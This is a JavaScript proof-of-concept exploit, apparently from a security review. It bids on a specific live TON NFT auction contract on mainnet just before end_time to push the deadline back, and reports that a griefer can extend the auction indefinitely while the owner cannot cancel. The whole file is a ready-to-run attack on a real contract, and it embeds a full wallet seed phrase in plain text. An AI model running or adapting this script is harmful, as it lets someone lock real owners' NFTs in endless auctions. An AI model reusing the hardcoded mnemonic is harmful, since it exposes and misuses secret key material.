/**
 * HYP-02 Mainnet PoC — bid near end_time to extend auction
 * Auction: 0:abb6f6a23c925ea10cd275e0867c5127b8caa9ac47bf3bae9394ab9e516f9931
 * NFT:     0:ad494326a2e740e36deb74292d9b5769d164c62af3b8748345d9a2adecd9cdf0
 */

const { mnemonicToWalletKey } = require('./nft-contracts/node_modules/@ton/crypto');
const { WalletContractV4, TonClient, internal, toNano, Address, beginCell } = require('./nft-contracts/node_modules/@ton/ton');
const { external, storeMessage } = require('./nft-contracts/node_modules/@ton/core');

const ATTACKER_MNEMONIC = 'asthma black design brick oxygen cat that potato nurse umbrella quote snack bag color walnut jump stem cloth kit sand volcano secret cloth better';
const AUCTION_ADDR = Address.parse('0:abb6f6a23c925ea10cd275e0867c5127b8caa9ac47bf3bae9394ab9e516f9931');
const NFT_ADDR    = Address.parse('0:ad494326a2e740e36deb74292d9b5769d164c62af3b8748345d9a2adecd9cdf0');

// step_time=10 stored as minutes → 600s
const STEP_TIME_SEC = 600;

const client = new TonClient({ endpoint: 'https://toncenter.com/api/v2/jsonRPC' });

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function fmt(n) { return (Number(n) / 1e9).toFixed(4); }
function ts(n) { return new Date(Number(n) * 1000).toISOString(); }

async function withRetry(fn, max = 8) {
  for (let i = 1; i <= max; i++) {
    try { return await fn(); } catch (e) {
      if (i < max) { await sleep(e.message?.includes('429') ? 8000 * i : 2000); continue; }
      throw e;
    }
  }
}

async function getAuctionEndTime() {
  const r = await withRetry(() => client.runMethod(AUCTION_ADDR, 'get_sale_data'));
  r.stack.readBigNumber(); // 0
  r.stack.readBigNumber(); // 1
  const endTime = r.stack.readBigNumber(); // 2 = end_time
  return Number(endTime);
}

async function sendTx(openedWallet, rawWallet, key, messages) {
  const seqno = await withRetry(() => openedWallet.getSeqno());
  await sleep(1000);
  const body = rawWallet.createTransfer({ seqno, secretKey: key.secretKey, messages });
  const ext = external({ to: rawWallet.address, init: null, body });
  const boc = beginCell().store(storeMessage(ext)).endCell().toBoc();
  await withRetry(() => client.sendFile(boc));
  return seqno;
}

async function main() {
  const atkKey = await mnemonicToWalletKey(ATTACKER_MNEMONIC.split(' '));
  const atkWallet = WalletContractV4.create({ publicKey: atkKey.publicKey, workchain: 0 });
  const atk = client.open(atkWallet);

  console.log('=== HYP-02 Mainnet Bid PoC ===');
  console.log('Attacker:', atkWallet.address.toString({ bounceable: false }));

  const bal = await withRetry(() => client.getContractState(atkWallet.address));
  console.log('Balance:', fmt(BigInt(bal.balance || '0')), 'TON');

  const endTimeBefore = await getAuctionEndTime();
  const bidWindowOpens = endTimeBefore - STEP_TIME_SEC;
  const now = Math.floor(Date.now() / 1000);
  console.log('\nend_time:       ', ts(endTimeBefore));
  console.log('bid window opens:', ts(bidWindowOpens));
  console.log('now:             ', ts(now));

  // Wait for bid window
  const waitMs = Math.max(0, (bidWindowOpens - now + 3) * 1000);
  if (waitMs > 0) {
    const waitSec = Math.ceil(waitMs / 1000);
    console.log(`\nWaiting ${waitSec}s for bid window...`);
    await sleep(waitMs);
  } else {
    console.log('\nBid window already open!');
  }

  // Send bid — empty body = bid op in auction contracts
  console.log('\nSending bid (1.1 TON)...');
  await sendTx(atk, atkWallet, atkKey, [
    internal({ to: AUCTION_ADDR, value: toNano('1.1'), bounce: true }),
  ]);
  console.log('TX sent, waiting 25s...');
  await sleep(25000);

  // Check end_time after bid
  const endTimeAfter = await getAuctionEndTime();
  const extended = endTimeAfter > endTimeBefore;
  const delta = endTimeAfter - endTimeBefore;

  console.log('\n=== RESULT ===');
  console.log('end_time before:', ts(endTimeBefore));
  console.log('end_time after: ', ts(endTimeAfter));
  console.log('Extended by:', delta, 's');
  console.log('end_time extended:', extended ? `✅ YES (+${delta}s)` : '❌ NO');
  console.log('\nAuction tonscan:', 'https://tonscan.org/address/' + AUCTION_ADDR.toRawString());
  console.log('NFT tonscan:    ', 'https://tonscan.org/address/' + NFT_ADDR.toRawString());
  console.log('GetGems NFT:    ', 'https://getgems.io/nft/' + NFT_ADDR.toString({ bounceable: true }));

  if (extended) {
    console.log('\n✅ HYP-02 CONFIRMED ON MAINNET');
    console.log('   NFT owner cannot cancel while last_bid > 0 (exit 1009)');
    console.log('   Griever can extend indefinitely at ~0.006 TON/cycle gas cost');
  }
}

main().catch(console.error);
